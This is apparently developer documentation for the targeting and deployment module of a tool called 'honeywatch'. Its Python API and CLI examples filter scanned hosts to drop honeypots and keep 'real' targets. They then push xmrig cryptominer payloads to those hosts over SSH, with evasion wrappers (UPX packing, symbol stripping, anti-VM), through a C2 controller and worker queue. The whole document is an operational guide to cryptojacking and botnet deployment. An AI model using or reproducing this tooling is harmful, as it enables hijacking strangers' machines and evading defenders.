# Operations & Targeting

`honeywatch/ops/` — selects verified hosts and builds deployment manifests for the C2 plane. Source: `ops/targeting.py:76`, `ops/deploy.py:192`.

## Targeting (`ops/targeting.py`)

### `TargetFilter`

```python
from honeywatch.ops import TargetFilter

filter_ = TargetFilter(
    labels={"real", "likely_real"},   # set[str] | None — only include these final_labels
    min_confidence=0.7,                # float — inclusive lower bound
    max_confidence=1.0,                # float — inclusive upper bound
    require_flags={"chacha"},          # set[str] | None — host must have all
    exclude_flags={"honeypot"},        # set[str] | None — host must have none
    allowed_categories=["miner"],      # list[str] | None — propagation to Target
    limit=100,                         # int | None — cap after filtering
)

filter_.match(score: Score) -> bool   # checks label, confidence, flags
```

All fields are optional; omitted checks pass. `limit` is applied after local filtering (not in SQL).

### `select_targets(store, filter_, ssh_user=None, ssh_key=None) -> list[Target]`

```python
from honeywatch.ops import select_targets
from honeywatch.store import Store

store = Store("honeywatch.db")
targets = select_targets(store, filter_, ssh_user="admin", ssh_key="/path/to/id_rsa")
# → [Target(ip="1.2.3.4", port=22, label="real", confidence=0.91, profile_key="abc...", allowed_categories=["miner"], ssh_user="admin", ssh_key="..."), ...]
```

- Queries `store.query_scores(limit=limit or 1000, min_confidence=min_confidence)` (SQL filter).
- Converts each `Score` → `Target` via `_score_to_target(score, allowed_categories)` — copies `ip`, `port`, `final_label`→`label`, `final_confidence`→`confidence`, `profile_key` from fingerprint, propagates `allowed_categories`, `ssh_user`/`ssh_key`.
- Filters locally for `max_confidence`, `labels`, `require_flags`/`exclude_flags`, then caps to `limit`.

`Target` is at `models.py:108`:

```python
@dataclass
class Target:
    ip: str
    port: int
    label: str = ""
    confidence: float = 0.0
    profile_key: str = ""
    allowed_categories: list[str] = field(default_factory=list)
    ssh_user: str | None = None
    ssh_key: str | None = None
    ssh_pass: str | None = None
```

## Deploy (`ops/deploy.py`)

### `build_manifest(payload_id, targets, variables, apply_evasion=None) -> DeploymentManifest`

```python
from honeywatch.ops import build_manifest

manifest = build_manifest(
    payload_id="xmrig",
    targets=targets,
    variables={"pool": "stratum+tcp://pool:3333", "wallet": "WALLET", "worker": "hw"},
    apply_evasion=["upx", "symbol_strip"],  # or None for default_evasion
)
# manifest.payload  → Payload
# manifest.variables → merged with defaults via merge_defaults()
# manifest.per_host_scripts → dict[str, str] per-ip via render_manifest_scripts()
```

- Validates `payload_id` via `get_payload` (raises `KeyError` if unknown).
- Calls `validate_variables` — raises `ValueError` if any `required` var is missing.
- Calls `merge_defaults` to fill `config_schema` defaults (e.g. `install_dir`, `pass="x"`).
- Renders per-host scripts via `render_manifest_scripts` (`payloads/scripts.py:100`).
- When `apply_evasion` is non-empty, wraps scripts via `_wrap_with_evasion` (see Payloads → Evasion Chaining).

`DeploymentManifest` at `models.py:123`:

```python
@dataclass
class DeploymentManifest:
    payload: Payload
    targets: list[Target]
    variables: dict[str, Any] = field(default_factory=dict)
    per_host_scripts: dict[str, str] = field(default_factory=dict)
```

### `prepare_evasion_pipeline(evasion_spec) -> list[str]`

```python
from honeywatch.ops import prepare_evasion_pipeline

prepare_evasion_pipeline("upx,symbol_strip")   # → ["upx", "symbol_strip"]
prepare_evasion_pipeline(["upx", "anti_vm"])   # → ["upx", "anti_vm"]
prepare_evasion_pipeline(None)                 # → []
```

Splits CSV string or passes through list, filters via `_is_evasion_payload` (checks `payload.category == "evasion"`). Unknown/non-evasion IDs are dropped silently.

Default comes from `payloads.default_evasion` (`["upx","symbol_strip"]`) when `--evasion` is omitted (CLI does this in `cli.py:1034`).

### `enqueue_operation(c2_store, manifest, operation_id=None) -> Operation`

```python
from honeywatch.ops import enqueue_operation
from honeywatch.c2.store import C2Store

c2_store = C2Store("honeywatch.db")
op = enqueue_operation(c2_store, manifest)
# op.id, op.payload_id, op.target_ips, op.status == "running", op.manifest, op.result_log
```

- Generates `operation_id` via `generate_operation_id()` (`scripts.py:100` → `"hw-"+random 10 hex`) if not supplied.
- Creates `Operation` row via `c2_store.create_operation` (id `op-<hex12>`, `target_ips` CSV, `manifest` JSON with `variables`/`scripts`/`operation_id`).
- Creates one `WorkerTask` per target (`status="pending"`, `category=payload.category`, `script=per_host_scripts[ip]`, `variables=merged`) via `c2_store.create_task`.
- Updates operation status to `"running"`.
- Returns the fetched `Operation`.

`Operation` at `models.py:133`:

```python
@dataclass
class Operation:
    id: str
    payload_id: str
    target_ips: list[str] = field(default_factory=list)
    status: str = "pending"  # pending | running | completed | failed | cancelled
    manifest: dict[str, Any] = field(default_factory=dict)
    result_log: list[dict[str, Any]] = field(default_factory=list)
    created_at: str = ""
    updated_at: str = ""
```

### `dispatch_to_controller(controller_url, manifest, operation_id=None) -> dict`

```python
from honeywatch.ops.deploy import dispatch_to_controller

result = dispatch_to_controller("http://127.0.0.1:8443", manifest)
# → {"id": "op-abc...", ...}  (JSON from POST /api/operations)
```

POSTs `{payload_id, target_ips, manifest: {variables, scripts, operation_id}}` to `controller_url/api/operations` via `urllib.request` (stdlib), timeout 60 s. Used by `honeywatch deploy --controller-url`.

## CLI

```bash
# Store selection (default labels real+likely_real, min 0.7)
honeywatch deploy xmrig --target-label real --min-confidence 0.9 --var pool=... --var wallet=... --skip-vpn-check

# File selection (skip store)
honeywatch deploy stratum --target-file targets.txt --var upstream_pool=pool:3333 --skip-vpn-check
# targets.txt: one ip[:port] per line, # comments allowed

# Limits and evasion
honeywatch deploy xmrig --limit 100 --evasion upx,symbol_strip,anti_vm --var pool=... --var wallet=... --skip-vpn-check

# Dry run (no enqueue)
honeywatch deploy xmrig --target-file targets.txt --var pool=... --var wallet=... --dry-run --skip-vpn-check

# Via controller API
honeywatch deploy xmrig --controller-url http://c2:8443 --var pool=... --var wallet=... --skip-vpn-check

# Override exec creds
honeywatch deploy xmrig --ssh-user admin --ssh-key ~/.ssh/id_rsa --var pool=... --var wallet=... --skip-vpn-check
```

Handler at `cli.py:981` `_cmd_deploy` — see [CLI Reference](cli.md).

## Flow

```
Scan/Probe → SQLite Store
  → TargetFilter → select_targets → list[Target]
  → build_manifest (validate + render)
  → [optional] _wrap_with_evasion
  → enqueue_operation OR dispatch_to_controller
  → C2Store Operation + WorkerTasks
  → Worker claims and executes
```

## See Also

- [Payloads](payloads.md) — registry and script templates
- [C2 Controller](c2.md) — `C2Store` and `Worker`
- [Storage](storage.md) — `query_scores`
